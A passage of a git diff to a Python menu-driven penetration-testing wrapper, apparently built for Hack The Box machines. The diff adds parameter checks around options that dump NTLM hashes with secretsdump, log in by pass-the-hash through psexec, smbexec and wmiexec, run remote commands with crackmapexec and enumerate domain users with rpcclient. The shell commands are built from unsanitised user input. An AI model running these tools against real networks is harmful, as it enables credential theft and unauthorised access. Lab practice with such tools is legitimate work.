-      command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
-      print("\n[*] Checking downloaded files: \n")
-      command("ls -la ./" + DIR.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
+         print("\n[*] Checking downloaded files: \n")
+         command("ls -la ./" + DIR.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s " + TIP.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      print("\n[*] Enumerating, please wait this can take sometime...")
-      command(PATH + "secretsdump.py " + DOM.rstrip(" ") + '/' + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
+      CheckParams = 0
 
-      command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
-      os.remove("SECRETS2.tmp")
-      command("cat SECRETS.tmp | wc -l > count.txt")
-      count = int(linecache.getline("count.txt", 1))
-      os.remove("count.txt")
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
 
-      for x in range(0, count):
-         data = linecache.getline("SECRETS.tmp",x+1)
-         data = data.replace(":::","")
-         temp = DOM.rstrip(" ") + "\\"
-         data = data.replace(temp,"")
-         temp = DOM.rstrip(" ") + ".LOCAL\\"
-         data = data.replace(temp,"")
-         try:
-            get1,get2,get3,get4 = data.split(":") 
-         except ValueError:
-            get1 = "Error..."
-            get4 = "Error..."
-         get1 = get1.rstrip("\n")
-         get4 = get4.rstrip("\n")
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
 
-         print("[+] Found User", get1)
-         USER[x] = get1[:COL3]
-         PASS[x] = get4[:COL4]
-         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3) 			# USER
-         if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD
+      if CheckParams != 1:
+         print("\n[*] Enumerating, please wait this can take sometime...")
+         command(PATH + "secretsdump.py " + DOM.rstrip(" ") + '/' + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
 
-      for z in range(0, MAXX):
-         if USER[z].rstrip(" ") == USR.rstrip(" "): NTM = PASS[z]			# RESET DISPLAY HASH
+         command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
+         os.remove("SECRETS2.tmp")
+         command("cat SECRETS.tmp | wc -l > count.txt")
+         count = int(linecache.getline("count.txt", 1))
+         os.remove("count.txt")
 
-      os.remove("SECRETS.tmp")
+         for x in range(0, MAXX):
+            USER[x]=" "*COL3								# CLEAN CURRENT VALUES
+            PASS[x]=" "*COL4
+
+         for x in range(0, count):
+            data = linecache.getline("SECRETS.tmp",x+1)
+            data = data.replace(":::","")
+            temp = DOM.rstrip(" ") + "\\"
+            data = data.replace(temp,"")
+            temp = DOM.rstrip(" ") + ".LOCAL\\"
+            data = data.replace(temp,"")
+            try:
+               get1,get2,get3,get4 = data.split(":") 
+            except ValueError:
+               get1 = "Error..."
+               get4 = "Error..."
+            get1 = get1.rstrip("\n")
+            get4 = get4.rstrip("\n")
+
+            print("[+] Found User", get1)
+            USER[x] = get1[:COL3]
+            PASS[x] = get4[:COL4]
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3) 			# USER
+            if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD
+
+         for z in range(0, MAXX):
+            if USER[z].rstrip(" ") == USR.rstrip(" "): NTM = PASS[z]			# RESET DISPLAY HASH
+
+         os.remove("SECRETS.tmp")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
-# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers
-# Details :                        crackmapexec smb IP -u Administrator -p password --local-auth --shares
-# Details :                        crackmapexec smb IP -u Administrator -H hash -x 'net user Administrator /domain'
+# Version : Monteverde
+# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='54':
-      print("\n[*] Enumerating " + TIP.rstrip(" ") +  " with user " + USR.rstrip(" ") + " and password '" + PAS.rstrip(" ") +"'...\n")
+      CheckParams = 0
 
-      command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
-      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x '" + CMD.rstrip(" ") + "'")
-      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
-      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")
-      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
-      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
-#      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         print("\n[*] Enumerating " + TIP.rstrip(" ") +  " with user " + USR.rstrip(" ") + " and password '" + PAS.rstrip(" ") +"'...\n")
+
+         command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x '" + CMD.rstrip(" ") + "'")
+         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
+         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")
+         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
+         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
+#        command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
       
-      HASH = "." # Reset Value
-      for x in range (0, MAXX):
-         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
+         HASH = "." # Reset Value
+         for x in range (0, MAXX):
+            if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
 
-      print("\n[*] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")
+         print("\n[*] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")
 
-      if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
-         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
-      else:
-         print("[-] No NTLM HASH was found for user " + IMP.rstrip(" ") + "...")
+         if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
+         else:
+            print("[-] No NTLM HASH was found for user " + IMP.rstrip(" ") + "...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
-      print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
-      command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      CheckParams = 0
 
-      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
-      HASH = "." # Reset hash value
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
 
-      for x in range (0,MAXX):
-         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
 
-      if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
-         command(PATH + "psexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
-      else:
-         print("\n[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
+      if CheckParams != 1:
+         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
+         command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+
+         print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
+         HASH = "." # Reset hash value
+
+         for x in range (0,MAXX):
+            if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
+
+         if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
+            command(PATH + "psexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
+         else:
+            print("\n[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - domain/username:password@<targetName or address
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='56':
-      print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
-      command(PATH + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
+         command(PATH + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
       
-      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
-      HASH = "." # Reset hash value
+         print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
+         HASH = "." # Reset hash value
 
-      for x in range (0,MAXX):
-         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
+         for x in range (0,MAXX):
+            if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
 
-      if HASH != ".":
-         command(PATH + "smbexec.py -hashes :" + HASH + " " + DOM.rstrip(" ") + "\\" + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
-      else:
-         print("[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
+         if HASH != ".":
+            command(PATH + "smbexec.py -hashes :" + HASH + " " + DOM.rstrip(" ") + "\\" + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
+         else:
+            print("[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='57':
-      print("\n[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
-      command(PATH + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
+         command(PATH + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       
-      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
-      HASH = "." # Reset Hash value
+         print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
+         HASH = "." # Reset Hash value
 
-      for x in range (0,MAXX):
-         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
+         for x in range (0,MAXX):
+            if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
 
-      if HASH != ".":  
-         command(PATH + "wmiexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))   
-      else:
-         print("[-] No NTLM HASHH was found for user " + IMP.rstrip(" ") + "...")
+         if HASH != ".":  
+            command(PATH + "wmiexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))   
+         else:
+            print("[-] No NTLM HASHH was found for user " + IMP.rstrip(" ") + "...")
       prompt()     
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - crewl -d 3 -m5 -w textfile.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='58':
-      command("cewl -d 3 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
-      print("\n[+] Userlist generated via website...")
+      if TIP[:5] != "EMPTY":
+         command("cewl -d 3 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
+         print("\n[+] Userlist generated via website...")
 
-      if os.path.exists("/usr/share/ncrack/minimal.usr"):
-         command("cat /usr/share/ncrack/minimal.usr >> users.txt 2>&1")
-         command("sed -i '/#/d' users.txt 2>&1")
-         print("[+] NCrack minimal.usr list added as well...")
+         if os.path.exists("/usr/share/ncrack/minimal.usr"):
+            command("cat /usr/share/ncrack/minimal.usr >> users.txt 2>&1")
+            command("sed -i '/#/d' users.txt 2>&1")
+            print("[+] NCrack minimal.usr list added as well...")
 
-      for x in range (0,MAXX):
-         USER[x] = linecache.getline("users.txt", x+1).rstrip(" ")
-         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)      
-
-#      if USER[12][:1] != " ": USER[11] = "Some users are not shown!!"
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("users.txt", x+1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
       prompt()
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Nano users.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1616,79 +1971,85 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - pftb IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='60':
-      command("pftp " + TIP.rstrip(" "))
+      if TIP[:5] != "EMPTY":
+         command("pftp " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ssh -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='61':
-      command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
+      if TIP[:5] != "EMPTY":
+         command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - telnet -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='62':
-      command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
+      if TIP[:5] != "EMPTY":
+         command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - nc IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='63':
-      command("nc " + TIP.rstrip(" "))
+      if TIP[:5] != "EMPTY":
+         command("nc " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Windows remote login on port 5985.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='64':
-      command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
+      if TIP[:5] != "EMPTY":
+         command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - rdesktop - u user -p password -d domain / IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='65':
-      command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
+      if TIP[:5] != "EMPTY":
+         command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1699,7 +2060,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1710,125 +2071,116 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
-# Details : Menu option selected - Autofill DOMAIN, SID etc.
+# Version : Monteverde
+# Details : Menu option selected - Autofill DOMAIN, SID, SHARES, USERS etc.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='69':
-      DOM = " "*COL1
-      SID = " "*COL1
+      if TIP[:5] != "EMPTY":
+         print("\n[*] Attempting to enumerate domain name...")
+         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > temp.txt")
 
-      print("\n[*] Attempting to enumerate domain name...")
-      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > temp.txt")
-
-      test1 = linecache.getline("temp.txt", 1)
-      if test1[:6] != "Cannot":
-         try:
-            temp,DOM = test1.split(":")
-         except ValueError:
-            DOM = "Error..."
-         DOM = DOM.strip(" ")
-         if len(DOM) < COL1:
-            DOM = padding(DOM, COL1)
-         print("[+] Found domain", DOM)
-         command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
-         print("\n[*] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
-      else:
-         print("[-] Unable to enumerate domain name...")      
-
-      print("\n[*] Attempting to enumerate domain SID...")
-      test2 = linecache.getline("temp.txt", 2)
-      if test2[:6] != "Cannot":
-         try:
-            temp,SID = test2.split(":")
-         except ValueError:
-            SID = "Error..."
-         SID = SID.strip(" ")
-         if len(SID) < COL1:
-            SID = padding(SID, COL1)
-         print("[+] Found SID", SID)
-      else:
-         print("[-] Unable to enumerate SID...") 
-
-      if os.path.exists("temp.txt"):
-         os.remove("temp.txt")
-
-# -------------------------------------------------------------------------------------
-# ENUMERATE SHARES
-# -------------------------------------------------------------------------------------
-    
-      print("[*] Attempting to enumerate shares...")
-      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares1.txt")
-
-      test3 = linecache.getline("shares1.txt", 1)
-      if test3[:9] != "Could not" and test3[:6] != "result":
-         for x in range (0, MAXX):
-            SHAR[x] = " "*COL2 						# Clean current values.
-
-         command("sed -i -n '/netname: /p' shares1.txt")		# Format text.
-         command("sort shares1.txt > shares2.txt")
-         command("cat shares2.txt | wc -l > count.txt")
-
-         count = int(linecache.getline("count.txt", 1))      
-         for x in range(0, count):
-            SHAR[x] = linecache.getline("shares2.txt", x + 1)
-            SHAR[x] = SHAR[x].replace(" ","")
+         test1 = linecache.getline("temp.txt", 1)
+         if test1[:6] != "Cannot":
+            DOM = " "*COL1							# Clean current values
+            SID = " "*COL1
             try:
-               share2, SHAR[x] = SHAR[x].split(":")
+               temp,DOM = test1.split(":")
             except ValueError:
-               SHAR[x] = "Error..."
-            if len(SHAR[x]) < COL2: SHAR[x] = padding(SHAR[x], COL2)
-            print("[+] Found share " + SHAR[x])
-      else:
-         print("[-] Unable to enumerate shares...")   
+               DOM = "Error..."
+            DOM = DOM.strip(" ")
+            if len(DOM) < COL1:
+               DOM = padding(DOM, COL1)
+            print("[+] Found domain", DOM)
+            command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+            print("\n[*] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
+         else:
+            print("[-] Unable to enumerate domain name...")      
+
+         print("\n[*] Attempting to enumerate domain SID...")
+         test2 = linecache.getline("temp.txt", 2)
+         if test2[:6] != "Cannot":
+            try:
+               temp,SID = test2.split(":")
+            except ValueError:
+               SID = "Error..."
+            SID = SID.strip(" ")
+            if len(SID) < COL1:
+               SID = padding(SID, COL1)
+            print("[+] Found SID", SID)
+         else:
+            print("[-] Unable to enumerate SID...") 
+
+         if os.path.exists("temp.txt"):
+            os.remove("temp.txt")
+   
+         print("[*] Attempting to enumerate shares...")
+         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares1.txt")
+
+         test3 = linecache.getline("shares1.txt", 1)
+         if test3[:9] != "Could not" and test3[:6] != "result":
+            for x in range (0, MAXX):
+               SHAR[x] = " "*COL2 						# Clean current values.
+
+            command("sed -i -n '/netname: /p' shares1.txt")		# Format text.
+            command("sort shares1.txt > shares2.txt")
+            command("cat shares2.txt | wc -l > count.txt")
+
+            count = int(linecache.getline("count.txt", 1))      
+            for x in range(0, count):
+               SHAR[x] = linecache.getline("shares2.txt", x + 1)
+               SHAR[x] = SHAR[x].replace(" ","")
+               try:
+                  share2, SHAR[x] = SHAR[x].split(":")
+               except ValueError:
+                  SHAR[x] = "Error..."
+               print("[+] Found share " + SHAR[x].rstrip("\n"))
+               if len(SHAR[x]) < COL2: SHAR[x] = dpadding(SHAR[x], COL2)
+         else:
+            print("[-] Unable to enumerate shares...")   
      
-      if os.path.exists("count.txt"):
-         os.remove("count.txt")
-      if os.path.exists("shares1.txt"):
-         os.remove("shares1.txt")
-      if os.path.exists("shares2.txt"):
-         os.remove("shares2.txt")
+         if os.path.exists("count.txt"):
+            os.remove("count.txt")
+         if os.path.exists("shares1.txt"):
+            os.remove("shares1.txt")
+         if os.path.exists("shares2.txt"):
+            os.remove("shares2.txt")
 
-# -------------------------------------------------------------------------------------
-# ENUMERATE DOMAIN USERS
-# -------------------------------------------------------------------------------------
+         print("\n[*] Attempting to enumerate domain users...")    
+         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers1.txt")      
 
-      print("\n[*] Attempting to enumerate domain users...")    
-      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers1.txt")      
-
-      test4 = linecache.getline("domusers1.txt", 1)
-      if test4[:9] != "Could not" and test4[:6] != "result":
-         for x in range (0, MAXX):
-            USER[x] = " "*COL3						# Clean current values.
-            PASS[x] = " "*COL4
+         test4 = linecache.getline("domusers1.txt", 1)
+         if test4[:9] != "Could not" and test4[:6] != "result":
+            for x in range (0, MAXX):
+               USER[x] = " "*COL3						# Clean current values.
+               PASS[x] = " "*COL4
  
-         command("sort domusers1.txt > domusers2.txt")			# Format text.
-         command("cat domusers2.txt | wc -l > count2.txt")
-         count2 = int(linecache.getline("count2.txt", 1))
+            command("sort domusers1.txt > domusers2.txt")			# Format text.
+            command("cat domusers2.txt | wc -l > count2.txt")
+            count2 = int(linecache.getline("count2.txt", 1))
  
-         os.remove("domusers1.txt")
-         os.remove("count2.txt")
-         os.remove("users.txt")
-
-         for x in range(0, count2):
-            test5 = linecache.getline("domusers2.txt", x + 1)
-            try:
-               temp1,USER[x],temp2 = test5.split(":");
-            except ValueError:
-               USER[x] = "Error..."
-            USER[x] = USER[x].replace("[","")
-            USER[x] = USER[x].replace("]","")
-            USER[x] = USER[x].replace("rid","")
-            print ("[+] Found user", USER[x])
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-            command("echo " + USER[x] + " >> users.txt")
-      else:
-         print("[-] Unable to enumerate domain users...")
+            os.remove("domusers1.txt")
+            os.remove("count2.txt")
+            os.remove("users.txt")
+ 
+            for x in range(0, count2):
+               test5 = linecache.getline("domusers2.txt", x + 1)
+               try:
+                  temp1,USER[x],temp2 = test5.split(":");
+               except ValueError:
+                  USER[x] = "Error..."
+               USER[x] = USER[x].replace("[","")
+               USER[x] = USER[x].replace("]","")
+               USER[x] = USER[x].replace("rid","")
+               print ("[+] Found user", USER[x])
+               if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+               command("echo " + USER[x] + " >> users.txt")
+         else:
+            print("[-] Unable to enumerate domain users...")
       
-      if os.path.exists("domusers2.txt"):
-         os.remove("domusers2.txt")
+         if os.path.exists("domusers2.txt"):
+            os.remove("domusers2.txt")
       prompt()
 
-# -------------------------------------------------------------------------------------
 # Eof...	
